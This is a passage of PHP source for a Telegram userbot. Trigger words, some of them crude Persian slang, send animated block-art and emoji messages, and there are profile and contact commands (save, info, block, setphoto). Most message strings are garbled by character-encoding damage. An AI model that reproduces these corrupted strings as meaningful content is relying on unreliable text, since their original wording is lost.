โโโโโโโโโ
 โโ โโ"]);

                    }
                    if ($text == 'hack' or $text == 'Hack' or $text == 'ูฺฉ' or $text == 'ูฺฉ ุดุฏ?') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
โโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโฌโฌโฌโฌโฌโฌโฌโโฌโฌโโ 
โโโโโโโโโฌโฌโโโโโโโฌโฌโฌโฌโฌโฌโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโ
โโโโโโโโฌโฌโฌโฌโฌโฌโโโโฌโฌโฌโฌโฌโฌโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโฌโฌโฌโฌโฌโฌโฌโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโโโโโโโโโโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโ
โโโโโโโโโโโฌโฌโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโฌโฌโฌโฌโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ
โโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโโโฌโฌโฌโฌโฌโโโ 
โโโโโโโโโโโโโโโโโโโโฌโโโโโฌโฌโฌโโโโโฌโฌโฌโฌโฌโฌโโโ
โโโโโโโโโโโโโโโโโโโฌโฌโฌโโโฌโโโโโโฌโฌโฌโฌโฌโฌโฌโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโ
โโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโ 
โโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโ 
โโโโโโโโโโโโโโโโโโฌโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโโโโโโโโโโโโ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโฌโฌโฌโฌโฌโฌโฌโโฌโฌโโ 
โโโโโโโโโฌโฌโโโโโโโฌโฌโฌโฌโฌโฌโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโ 
โโโโโโโโฌโฌโฌโฌโฌโฌโโโโฌโฌโฌโฌโฌโฌโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโฌโฌโฌโฌโฌโฌโฌโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโโโโโโโโโโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโ 
โโโโโโโโโโโฌโฌโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโฌโฌโฌโฌโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโ 
โโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโฌโโฌโฌโโโ 
โโโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโโโฌโฌโฌโฌโฌโโโ 
โโโโโโโโโโโโโโโโโโโโฌโโโโโฌโฌโฌโโโโโฌโฌโฌโฌโฌโฌโโโ 
โโโโโโโโโโโโโโโโโโโฌโฌโฌโโโฌโโโโโโฌโฌโฌโฌโฌโฌโฌโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโ 
โโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโ 
โโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโ 
โโโโโโโโโโโโโโโโโโฌโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโฌโฌโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโโฌโฌโฌโฌโฌโฌโโโโโโโโโโโโ']);

                    }
                    if ($text == 'love3' or $text == 'Love3' or $text == 'ุฏูุณุช') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโ']);

                    }
                    if ($text == 'ุฏููุช ุณุฑู?ุณ' or $text == 'koni' or $text == 'ฺฉูู?' or $text == 'ุฎุฎุฎ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ']);

                    }


                    if ($text == 'bk2' or $text == 'ุจฺฉ?ุฑู2') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐คค๐คค๐คค
๐คค         ๐คค
๐คค           ๐คค
๐คค        ๐คค
๐คค๐คค๐คค
๐คค         ๐คค
๐คค           ๐คค
๐คค           ๐คค
๐คค        ๐คค
๐คค๐คค๐คค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐         ๐
๐       ๐
๐     ๐
๐   ๐
๐๐
๐   ๐
๐      ๐
๐        ๐
๐          ๐
๐            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ฝ๐ฝ๐ฝ          ๐ฝ         ๐ฝ
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐คฌ        ๐คฌ       ๐คฌ   ๐คฌ
๐๐๐          ๐ค ๐ค
๐คจ         ๐      ๐   ๐
๐คฏ           ๐คฏ    ๐คฏ     ๐คฏ
๐ค           ๐ค    ๐        ๐
๐คซ       ๐คซ        ๐          ๐
๐คก๐คก๐คก          ๐             ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐ค         ๐ค      ๐ค   ๐ค
๐ค           ๐ค    ๐ค      ๐ค
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐ค๐ค๐ค          ๐ค๐ค
๐ค         ๐ค      ๐ค   ๐ค
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐ค        ๐ค       ๐ค   ๐ค
๐ค๐ค๐ค          ๐ค๐ค
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐ค           ๐ค    ๐ค     ๐ค
๐ค        ๐ค       ๐ค   ๐ค
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐ค         ๐ค      ๐ค       ๐ค
๐ค           ๐ค    ๐ค     ๐ค
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐ค         ๐ค      ๐ค       ๐ค
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐ค       ๐ค        ๐ค          ๐ค
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐ค           ๐ค    ๐ค        ๐ค
๐ค       ๐ค        ๐ค          ๐ค
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐ค           ๐ค    ๐ค      ๐ค
๐ค           ๐ค    ๐ค        ๐ค
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐ค         ๐ค      ๐ค   ๐ค
๐ค           ๐ค    ๐ค      ๐ค
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐ค๐ค๐ค          ๐ค๐ค
๐ค         ๐ค      ๐ค   ๐ค
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐ค        ๐ค       ๐ค   ๐ค
๐ค๐ค๐ค          ๐ค๐ค
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐ค           ๐ค    ๐ค     ๐ค
๐ค        ๐ค       ๐ค   ๐ค
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐ค         ๐ค      ๐ค       ๐ค
๐ค           ๐ค    ๐ค     ๐ค
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐ค         ๐ค      ๐ค       ๐ค
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐ค       ๐ค        ๐ค          ๐ค
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐ค           ๐ค    ๐ค        ๐ค
๐ค       ๐ค        ๐ค          ๐ค
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐ค           ๐ค    ๐ค      ๐ค
๐ค           ๐ค    ๐ค        ๐ค
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐ค         ๐ค      ๐ค   ๐ค
๐ค           ๐ค    ๐ค      ๐ค
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐ค๐ค๐ค          ๐ค๐ค
๐ค         ๐ค      ๐ค   ๐ค
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐ค        ๐ค       ๐ค   ๐ค
๐ค๐ค๐ค          ๐ค๐ค
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐ค           ๐ค    ๐ค     ๐ค
๐ค        ๐ค       ๐ค   ๐ค
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐ค         ๐ค      ๐ค       ๐ค
๐ค           ๐ค    ๐ค     ๐ค
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐ค         ๐ค      ๐ค       ๐ค
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐๐๐          ๐            ๐
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐ค๐ค๐ค          ๐ค         ๐ค
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐       ๐        ๐          ๐
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐ค       ๐ค        ๐ค          ๐ค
๐ค๐ค๐ค          ๐ค            ๐ค
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
๐คฌ๐คฌ๐คฌ          ๐คฌ         ๐คฌ
๐ก         ๐ก      ๐ก       ๐ก
๐คฌ           ๐คฌ    ๐คฌ     ๐คฌ
๐ก        ๐ก       ๐ก   ๐ก
๐คฌ๐คฌ๐คฌ          ๐คฌ๐คฌ
๐ก         ๐ก      ๐ก   ๐ก
๐คฌ           ๐คฌ    ๐คฌ      ๐คฌ
๐ก           ๐ก    ๐ก        ๐ก
๐คฌ       ๐คฌ        ๐คฌ          ๐คฌ
๐ก๐ก๐ก          ๐ก            ๐ก
"]);
                    }

                    if (preg_match("/^[\/\#\!]?(save)$/si", $text) && isset($update['message']['reply_to']['reply_to_msg_id'])) {
                        $me = yield $this->getSelf();
                        $me_id = $me['id'];
                        yield $this->messages->forwardMessages(['from_peer' => $peer, 'to_peer' => $me_id, 'id' => [$update['message']['reply_to']['reply_to_msg_id']]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฑโจ๏ธ> ๊ฑแดแด แดแด๐ฑโจ๏ธ"]);
                    }


                    if (preg_match("/^[\/\#\!]?(echo) (on|off)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(echo) (on|off)$/si", $text, $m);
                        $data['echo'] = $m[2];
                        yield $this->filePutContents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดแดสแด ษดแดแดก ษช๊ฑ $m[2]"]);
                    }

                    if (preg_match("/^[\/\#\!]?(info) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(info) (.*)$/si", $text, $m);
                        $mee = yield $this->getFullInfo($m[2]);
                        $me = $mee['User'];
                        $me_id = $me['id'];
                        $me_status = $me['status']['_'];
                        $me_bio = $mee['full']['about'];
                        $me_common = $mee['full']['common_chats_count'];
                        $me_name = $me['first_name'];
                        $me_uname = $me['username'];
                        $mes = "ษชแด : $me_id \nษดแดแดแด: $me_name \nแด๊ฑแดสษดแดแดแด: @$me_uname \n๊ฑแดแดแดแด๊ฑ: $me_status \nสษชแด: $me_bio \nแดแดแดแดแดษด ษขสแดแดแด๊ฑ แดแดแดษดแด: $me_common";
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $mes]);
                    }
                    if (preg_match("/^[\/\#\!]?(block) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(block) (.*)$/si", $text, $m);
                        yield $this->contacts->block(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "สสแดแดแดแดแด!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(unblock) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(unblock) (.*)$/si", $text, $m);
                        yield $this->contacts->unblock(['id' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดษดสสแดแดแดแดแด!"]);
                    }
                    if (preg_match("/^[\/\#\!]?(checkusername) (@.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(checkusername) (@.*)$/si", $text, $m);
                        $check = yield $this->account->checkUsername(['username' => str_replace("@", "", $m[2])]);
                        if ($check == false) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "แดxษช๊ฑแด๊ฑ!"]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๊ฐสแดแด!"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(setfirstname) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setfirstname) (.*)$/si", $text, $m);
                        yield $this->account->updateProfile(['first_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษดแดแดก ๊ฐษชส๊ฑแด ษดแดแดแด ๊ฑแดแด๏ธโ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setlastname) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setlastname) (.*)$/si", $text, $m);
                        yield $this->account->updateProfile(['last_name' => $m[2]]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษดแดแดก สแด๊ฑแด ษดแดแดแด ๊ฑแดแดโ"]);
                    }
                    if (preg_match("/^[\/\#\!]?(setphoto) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(setphoto) (.*)$/si", $text, $m);
                        if (strpos($m[2], '.jpg') !== false or strpos($m[2], '.png') !== false) {
                            copy($m[2], 'photo.jpg');
                            $photos_Photo = $this->photos->updateProfilePhoto(['id' => 'photo.jpg']);
